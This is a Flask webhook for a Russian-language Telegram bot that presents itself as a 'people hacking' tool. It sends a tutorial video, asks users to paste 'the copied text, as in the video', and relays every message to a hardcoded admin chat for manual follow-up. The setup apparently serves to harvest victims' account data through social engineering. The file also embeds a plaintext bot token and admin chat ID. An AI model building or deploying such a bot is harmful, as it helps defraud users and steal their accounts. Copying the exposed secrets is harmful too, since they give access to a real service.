from flask import Flask, request, jsonify
import requests
import os
import json
import time

app = Flask(__name__)

BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
ADMIN_CHAT_ID = "8625787020"

VIDEO_FILE_ID = "BAACAgEAAxkBAAP7akugXF318MJWQ3616dZDkwJJ4hkAAnEHAALuAmBGFLl3swomiE88BA"

KEYBOARD = {
    "keyboard": [
        ["📹 Тутор", "💀 Взломать"],
        ["📩 Отправить сообщение Админу"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

WELCOME_TEXT = "Здравствуйте! Я бот Взломщик людей 😀\nСкиньте сюда текст, как из видео, и к вам зайдёт админ-помощник 🆘 в личные сообщения спустя полчаса - час. Удачи!"

# Храним ID пользователя, которому отвечаем
pending_reply = {}

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    global pending_reply
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '').lower()
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']

        # === ЭТО ОТВЕТ АДМИНА (если сообщение пришло от тебя) ===
        if str(chat_id) == ADMIN_CHAT_ID and text and not text.startswith("/"):
            # Если есть кому ответить
            if pending_reply.get("user_id"):
                target_id = pending_reply["user_id"]
                # Отправляем ответ пользователю
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": target_id,
                        "text": f"📨 Ответ от Админа:\n{text}"
                    }
                )
                # Подтверждение админу
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"✅ Ответ отправлен пользователю @{pending_reply.get('username', 'anon')} (ID: {target_id})"
                    }
                )
                pending_reply = {}  # очищаем после ответа
                return "ok", 200
            else:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": "⚠️ Нет активного диалога с пользователем. Сначала получи сообщение от юзера."
                    }
                )
                return "ok", 200

        # === ПЕРЕСЫЛКА СООБЩЕНИЯ ОТ ПОЛЬЗОВАТЕЛЯ АДМИНУ ===
        if text:
            # Сохраняем, кому отвечать
            pending_reply["user_id"] = user_id
            pending_reply["username"] = username
            
            # Пересылаем админу
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": ADMIN_CHAT_ID,
                    "text": f"📩 От @{username} (ID: {user_id}):\n{text}\n\n➡️ Просто ответь на это сообщение, и ответ улетит пользователю."
                }
            )

        # === КНОПКА ТУТОР ===
        if text in ["📹 тутор", "тутор"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                json={
                    "chat_id": chat_id,
                    "video": VIDEO_FILE_ID,
                    "caption": "📹 Вот твой видео-туториал!"
                }
            )
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "Выбери действие:",
                    "reply_markup": KEYBOARD
                }
            )

        # === КНОПКА ВЗЛОМАТЬ ===
        elif text in ["💀 взломать", "взломать"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "Здравствуйте! Отправьте ваш скопированный текст сюда в чат!",
                    "reply_markup": KEYBOARD
                }
            )

        # === КНОПКА ОТПРАВИТЬ СООБЩЕНИЕ АДМИНУ ===
        elif text in ["📩 отправить сообщение админу", "отправить сообщение админу"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "✉️ Напишите ваше сообщение сюда, и мы передадим его Администратору.",
                    "reply_markup": KEYBOARD
                }
            )

        # === /start или любое другое сообщение ===
        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": WELCOME_TEXT,
                    "reply_markup": KEYBOARD
                }
            )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
